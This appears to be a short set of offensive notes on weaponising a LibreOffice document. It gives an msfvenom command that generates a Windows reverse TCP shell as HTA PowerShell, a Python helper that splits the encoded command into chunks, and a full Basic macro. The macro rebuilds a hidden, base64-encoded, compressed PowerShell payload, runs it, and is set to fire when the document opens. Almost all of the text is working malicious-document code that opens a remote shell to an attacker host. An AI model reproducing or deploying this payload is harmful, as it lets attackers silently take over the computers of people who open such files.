generate hta shell 

```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.217.140 LPORT=443 -f hta-psh -o shell
```

find the string starting woth powersehll.exe and use this scrit to split it

```
s = "powershell.exe ..."
n = 50
for i in range(0, len(s), n):
    chunk = s[i:i + n]
    print('Str = Str + "' + chunk + '"')

```


tools --> macros --> organize macros --> basic Libreoffice

Select document --> New

```macro
REM  *****  BASIC  *****

Sub Main
	Dim Str As String
	
	Str = Str + "cmd /C powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4Ad"
	Str = Str + "ABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewA"
	Str = Str + "kAGIAPQAnAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHgAZQAnA"
	Str = Str + "H0AZQBsAHMAZQB7ACQAYgA9ACQAZQBuAHYAOgB3AGkAbgBkAGk"
	Str = Str + "AcgArACcAXABzAHkAcwB3AG8AdwA2ADQAXABXAGkAbgBkAG8Ad"
	Str = Str + "wBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcAB"
	Str = Str + "vAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACcAfQA7ACQAcwA9A"
	Str = Str + "E4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEQ"
	Str = Str + "AaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHMAU"
	Str = Str + "wB0AGEAcgB0AEkAbgBmAG8AOwAkAHMALgBGAGkAbABlAE4AYQB"
	Str = Str + "tAGUAPQAkAGIAOwAkAHMALgBBAHIAZwB1AG0AZQBuAHQAcwA9A"
	Str = Str + "CcALQBuAG8AcAAgAC0AdwAgAGgAaQBkAGQAZQBuACAALQBjACA"
	Str = Str + "AJgAoAFsAcwBjAHIAaQBwAHQAYgBsAG8AYwBrAF0AOgA6AGMAc"
	Str = Str + "gBlAGEAdABlACgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB"
	Str = Str + "5AHMAdABlAG0ALgBJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkA"
	Str = Str + "GUAcgAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGU"
	Str = Str + "AbQAuAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEcAe"
	Str = Str + "gBpAHAAUwB0AHIAZQBhAG0AKAAoAE4AZQB3AC0ATwBiAGoAZQB"
	Str = Str + "jAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAE0AZQBtAG8AcgB5A"
	Str = Str + "FMAdAByAGUAYQBtACgALABbAFMAeQBzAHQAZQBtAC4AQwBvAG4"
	Str = Str + "AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAd"
	Str = Str + "AByAGkAbgBnACgAKAAoACcAJwBIADQAcwBJAEEAUABwAGQAawB"
	Str = Str + "tAEkAQwBBADcAMQBXACsAMgArAGoAUgBoAEQAKwAvAGEAVAA3A"
	Str = Str + "EgAOQBEAEoARQBxAEEANgBmAHMAVgBOAEwAcABGAE8ASwB2AGk"
	Str = Str + "ASgBZAHgATABiAEIAQgB6AGIAdABhAG8AMQBMAEwARAB4AG0Ad"
	Str = Str + "gBYAEIARQBqACsAdQA5ADcAOQAzAHsAMAB9AEIAQQBuAE8AcQB"
	Str = Str + "kAE4ASwAxADEAWABzAGcAeQA3ADgAOQBwAHYAdgBwAG4AQgBqA"
	Str = Str + "FEAJwAnACsAJwAnAE8AYgBFAHgAWQBJAHQARgB0ADcAZQBCAEM"
	Str = Str + "AKwAnACcAKwAnACcAZgBmAHcAZwBaAEcAdQBBAFEAcgBRAFMAc"
	Str = Str + "AB7ADAAfQBMAGoAYgBWAEUAbwBmAE4AMwBLAHgANQBOAEMAMQB"
	Str = Str + "CAHIAdABoAEMAKwBDAE4ARgBQAFcANgB5AFoAYgBJAFIATAB7A"
	Str = Str + "DAAfQByADYAOABiAGMAUgBqAGkAZwBLAGYAdgBwAFEANwBtAFM"
	Str = Str + "AaABUAGgAMQBZAEkAUwBIAEUAbQB5ADgASwBjAHcAOQBuAEcAS"
	Str = Str + "QB6ACsANABXAGoAOQBqAG0AdwBqAGUAaAA4AEUAZQBwAFEAOQB"
	Str = Str + "rAEMAMABVAHgAcwAxADAAQwAyAGoANABVAHoASgBYAEMAUwBzA"
	Str = Str + "HoANgB6AFUAUgBKAFgAeQBWAGgAVAB3AGkAWAB4ADkAOQA5AEY"
	Str = Str + "AZQBYAFoAVwBuAFoAZABhAFgAMgBOAEUASQAwAGsAMABkAGgAS"
	Str = Str + "ABIAHEANQBKAEQAcQBTAGcAJwAnACsAJwAnAEwAMwArAFgARQA"
	Str = Str + "0AGYAMQB1AGoAUwBWAFIASgAzAGIASQBJAHUAYgB5ADAAcABnA"
	Str = Str + "EUANQA3AFcAUwBHAFUAVABJAHgAYgBkAGcANwBRAG4AcgBtAFA"
	Str = Str + "AdgB7ADAAfQBpAFUAUwA0AHoAUABFADYASQBlAFoAeABHAEsAU"
	Str = Str + "wAzAFMAcwB5AGsAUQBwAEkASQBqADQATwBRADIAWQByAGoAaAB"
	Str = Str + "EAGkASwB4AEsASQB3AFMAeAB6AHsAMAB9ADUAdgBQAGYAcABGA"
	Str = Str + "G4AbQBmAFIAUQBIAG4ASwB4AHcAUwBRAHMAJwAnACsAJwAnADQ"
	Str = Str + "ARAB0AG4AYQB3AE8ARQBUAHMAWABGAFUANgBxAEwAQQBvAFgAa"
	Str = Str + "QBFADMAVABsAG8ARwBUAHcAawBnAFQAZQBYAFoAUgBCADcAWQB"
	Str = Str + "rAHMAcwBGAFkASwBZADAAcQBMAHcAYgA4AHgASQB0ADMAaQBUA"
	Str = Str + "FkALwBkAGUASgBlAG0AbABFAGsAZwBOAGUAQwBnAFgASQBhAEU"
	Str = Str + "AbgA3AHEAawB6AEoANgBZADQAMQBSAFIAUABCAEEAbwBrAGsAR"
	Str = Str + "wBHAGwAUgBBAEQAdwB2AGkAZgA0AHUAVABsADEARgBrADIAdAB"
	Str = Str + "mAG8ASQA1AHgANAAxADgAegBRADQAbgBHAE8ASwBWAEIAaQB3A"
	Str = Str + "GkAQgArAFUAdgBRAHEAVQBvADYATwBBAFoAYwBSAFkAbQAnACc"
	Str = Str + "AKwAnACcAcgBDAHIAYwBoAHoARwBXADUAOAA5AG8AUQAyAEwAe"
	Str = Str + "wAwAH0ANABuAHQAdABWAFgATgBGAFUATgB0ADYAcwBEAEcAegB"
	Str = Str + "HAEgASAAnACcAKwAnACcAbQBSAC8AVgBYAG0AUwAvADQANQA1A"
	Str = Str + "DEARQA1AG0AMABhAE4ANwBGAEwAQQB0AHoAYwBCAFcAaABGADc"
	Str = Str + "ASgB5AHAAMABxAGwAcwBZAEoAZgBpAEEAeAB5AGwAWABPAHcAV"
	Str = Str + "wB3AHAAUABFADcAQQBBADcAVABVAHkAeABoADMAaQBDAGIAMAB"
	Str = Str + "LAEsASAA5AFIAYQBLADgASwBmAGQAZABXAFkAVQBBAGUASABpA"
	Str = Str + "GcAMABaAGoAUwBBAHEAUwBMAGIAOABPAHAAZwAwAFoAWgBLAG8"
	Str = Str + "AQgBUAHAAZQBBAFgATABwAE8ANwBDADAANABFAEoAOQA0AEYAd"
	Str = Str + "wA2AHEANABsAGQANwBqADEANQBCAHkARwB4AFEAVgBFAFUARgB"
	Str = Str + "ZAFYAQgBEAEEAVgBxAEYAdwBVAEQASQA0AHEAZABvAHEAQQBFA"
	Str = Str + "EUAYwBtAE8AbABKAGkAegAnACcAKwAnACcAdwA2AE4ANABEAEY"
	Str = Str + "AZQBQAEsAUwBjADIAaQBuAGgAdQBiAGkANgAvAFIAagBQAHoAM"
	Str = Str + "gBtAEIAQgB4AHsAMAB9AFAAWQBoAHAAUQBDAEEAdgBmAEcARwB"
	Str = Str + "0AHMARQAwAFEAUwBRAG8AdABBAGwARABsAFoAMwBCAHYARgB5A"
	Str = Str + "DcAKwBKAEoATwBCAHEASQBVAGkAZwBiAHMAUABRAEUANgBZAEM"
	Str = Str + "AZABCAEEAYQBEAEoAMABRAEoASQBWAEEAZwBoAFYAdwB5AHsAM"
	Str = Str + "AB9AE4AZABXAGEANABwAFgASQBIAEgAbwBGAG0AMgBLAFAATwB"
	Str = Str + "nAE4AVwBXAGsAYwBlAEkAVQA4ADcASQBpAG4AbwA4AHcATABJA"
	Str = Str + "EcAVgA3AGcAawAnACcAKwAnACcAbwBPAHgANABzAFkASQBkAFU"
	Str = Str + "ARwBaAGIAdwBvAFcAQwBUAGsAMABIAG8AUwBoAEwAZgBlAGYAJ"
	Str = Str + "wAnACsAJwAnAHcAagBnAHgANABhAFQAUgBOAEkASQBjAFoAWQB"
	Str = Str + "WAEsAYQArAHIAbQBiAHIAagBDAGYARQBMAGsAWgBXAFEAewAwA"
	Str = Str + "H0ANABQAG0AQQBFAFQASQBBAFkAUgAyAHkARgBZAHEAaQAnACc"
	Str = Str + "AKwAnACcAdgBCAEYAUABlADAAcwAwAHEAZgB5AEgAVwBrAG8Ac"
	Str = Str + "wBDAFoAYQBRAEgAVgBiAFgAWgBLAHEAcwBpAEYAVgBUAFkAZQB"
	Str = Str + "mAFMAYwA0ADEAMQByAHgAMABiAG4AcQBQADMAWABMAFkAMwBQA"
	Str = Str + "HEAdQBvAGsAVwBhADMAaAAwADAAaAA5ADEAdQAvAGEAbABuAFc"
	Str = Str + "ASABWAHUAdABEAFIAKwB7ADAAfQA5AEMANAAzAG4AcAA0AGYAR"
	Str = Str + "ABTAFUANwBzAGkAYwA4AEsAbQBtAGQATwA5AEoAWgBUAG0AcAA"
	Str = Str + "3ADkAYwA5AHMAagBmADYAaQBqAFAAWgBsAGkAJwAnACsAJwAnA"
	Str = Str + "C8AMgA2AG4ANQBUAFUAYgBmADcAUgA4ADkAeABKADAAMwBYADk"
	Str = Str + "AUwA1AGQAWQAxAFQAOQB0AFUAMwA2ADQAOABaAFEAcgBkAFIAU"
	Str = Str + "QB2ADkAbQBLACsAMgBOADEAbwAxAGIAcQBVAFkAdABzAHUAawB"
	Str = Str + "OAGkARABwAGUAOQBOAGwAOQB7ADAAfQBMAEkAcAB7ADAAfQB0A"
	Str = Str + "CsAdwA5AFYASwA4AFEAMgBmAGIARABSADYAdgBLADkATAAyAG0"
	Str = Str + "ASwBCADMALwAzAE4ANwAzAFgASwB2AGoANgA4ADUAdQAwAGkAM"
	Str = Str + "QBmAGoAZQB0AEwAcABhAFUAbwBqAGEAQgBsAHQAVgBWADIAewA"
	Str = Str + "wAH0AMQBGAEQAWgBWAEMAMgB6AEwAWQA2AE4ARgB2AHEAYwBBA"
	Str = Str + "GgANwBGADEANwBaAHIAYwB7ADAAfQBlAHIAYgBFADIAMABoAHY"
	Str = Str + "AcwBGADAAMQBsAGkAcQBlAG8AYwBUADEAWQBJAFYAOABkAFcAe"
	Str = Str + "gBVAHkAWABUACsAewAwAH0AZgBMAEQAVgBoAGgARAAwACcAJwA"
	Str = Str + "rACcAJwBjAHEAVwB1AE8AWABqAEwAUAB2AGYASAB4AEgAbwBxA"
	Str = Str + "FcANgBoAHoAeQA2AGQASwBvADEAZQB2AE8AZwAvAFcAdgBsAHQ"
	Str = Str + "ARABmAG0AOQBxAHgAZgAyAHIAYQBlAFMAMABlAHMAMgBOAHEAa"
	Str = Str + "wB5ACcAJwArACcAJwBxAHIAWgA3AGEANwBDAGkAdABrAFcAbQA"
	Str = Str + "yAHAAMgBOAHIATwBSADMAZgAwACsAbgBZAHIARQA0AFoAdABqA"
	Str = Str + "GQAbABIADIAdwBRAHIATgA1AFoAeQAwAFYAWgA3ADMAaQBhAHY"
	Str = Str + "ANgAxADYANABPAHYAeQBZAEgAOQBGAFYAbgBSAFIAYwA4AHAAW"
	Str = Str + "AA1AG0AYwAxADIATgB4ADQAZwB5AGYAUABHAFkANAB2AFIAOQB"
	Str = Str + "2AGIAMwBhAEwARwBGAEwATgBjAHQAagA1ACcAJwArACcAJwBCA"
	Str = Str + "HEAbQBjAG0AQwBmAGgANQBiAFYANgBJAGgAeAB1ADAAVAB0AHI"
	Str = Str + "AJwAnACsAJwAnAGcAeAB3AC8AQQBpAEoAJwAnACsAJwAnAGIAN"
	Str = Str + "gBJAHUAZAB2AHQAWABnAGQAaABaAEcAUABLAEgAQQBCAGUAbgB"
	Str = Str + "kAGUAaQBtADAAVwB0AHIATwBPAFAARwBBAGsAMABaAEMAawBkA"
	Str = Str + "EsAZwB2AGMAUgBoAGcAQwBxAHsAMAB9AFEAaABtAFYATwBZADQ"
	Str = Str + "AVgBTAFoAaQBmAGoANABOAEMAOABZAFIAUwBsAEEAeQBLAFoAV"
	Str = Str + "gA2AFoAMgBDAE8AegBVAGsAeQB3ADgAQwA4AHIASAB7ADAAfQB"
	Str = Str + "aAEYAdgBYAFYAOQBQAEkAYwB5AGsATgBLAHgAUwBIAHcAYwBlA"
	Str = Str + "DkANAB1AFYANwBYAG0AbABBACcAJwArACcAJwBnADIAKwBzAHE"
	Str = Str + "AMwBVAEQAegBYAHcALwBxAHMAMQAyAEgAbwBIAHcAOABvAHEAS"
	Str = Str + "gBnAFAAaQBnAEUAeABxAG0AUgA0AHMAZwB6AEgAaQBDAHAATAA"
	Str = Str + "wAFAAMABBAEYASAB3AEUAYwBtAHQATABiAFkAJwAnACsAJwAnA"
	Str = Str + "EwAMgBGAEcAegBoAGYAUQBoAHUAQgBwAHAAYgBXAGQANABLAGU"
	Str = Str + "AeQBoAGgAOQBpAFYAMQAyAHMAVwBjADIASABLAEUARAB6AEsAJ"
	Str = Str + "wAnACsAJwAnAHAAdwA4ADEAawB5AC8AbABPAFMAZwBJAEUAegA"
	Str = Str + "vAEYAVQBvADgARwBSAEEAdgBoAHkANABCAGIAcQAvACsAewAwA"
	Str = Str + "H0AbQAwAHkAZgBxAFUARAAzAC8ATwBQADkASABtAHUAUABjADM"
	Str = Str + "AcAArACsAaQBVAHEAVwBZADQAdgBQAEQAOQB1AHUATgBGACsAM"
	Str = Str + "wA5AFoAMgBJAHcAUgBvAFMARABxAEEARQA5AGwAKwBKADAALwB"
	Str = Str + "KACsARwBJAGkAdQBXAEYAMQBtAEcAQgBFAEUAdAB1AE4AbABLA"
	Str = Str + "FAAbwBmAHYAWQBuADUAMgBDADUAOQBYAGgANgBiAC8ARgB6AC8"
	Str = Str + "AQgAvAHIANgBHAEMAdwBBAEEAJwAnACkALQBmACcAJwBNACcAJ"
	Str = Str + "wApACkAKQApACwAWwBTAHkAcwB0AGUAbQAuAEkATwAuAEMAbwB"
	Str = Str + "tAHAAcgBlAHMAcwBpAG8AbgAuAEMAbwBtAHAAcgBlAHMAcwBpA"
	Str = Str + "G8AbgBNAG8AZABlAF0AOgA6AEQAZQBjAG8AbQBwAHIAZQBzAHM"
	Str = Str + "AKQApACkALgBSAGUAYQBkAFQAbwBFAG4AZAAoACkAKQApACcAO"
	Str = Str + "wAkAHMALgBVAHMAZQBTAGgAZQBsAGwARQB4AGUAYwB1AHQAZQA"
	Str = Str + "9ACQAZgBhAGwAcwBlADsAJABzAC4AUgBlAGQAaQByAGUAYwB0A"
	Str = Str + "FMAdABhAG4AZABhAHIAZABPAHUAdABwAHUAdAA9ACQAdAByAHU"
	Str = Str + "AZQA7ACQAcwAuAFcAaQBuAGQAbwB3AFMAdAB5AGwAZQA9ACcAS"
	Str = Str + "ABpAGQAZABlAG4AJwA7ACQAcwAuAEMAcgBlAGEAdABlAE4AbwB"
	Str = Str + "XAGkAbgBkAG8AdwA9ACQAdAByAHUAZQA7ACQAcAA9AFsAUwB5A"
	Str = Str + "HMAdABlAG0ALgBEAGkAYQBnAG4AbwBzAHQAaQBjAHMALgBQAHI"
	Str = Str + "AbwBjAGUAcwBzAF0AOgA6AFMAdABhAHIAdAAoACQAcwApADsA"
	
	Shell(Str)
	
End Sub
```

make it autorun

```
1) select the main menu "Tools:Customize..."
2) in the dialog that pops up, select the tab "Events"
3) There you can attach your macro to the "Document loading finished" event ( or "Open Document" , "Activate Document" , ..  )
```

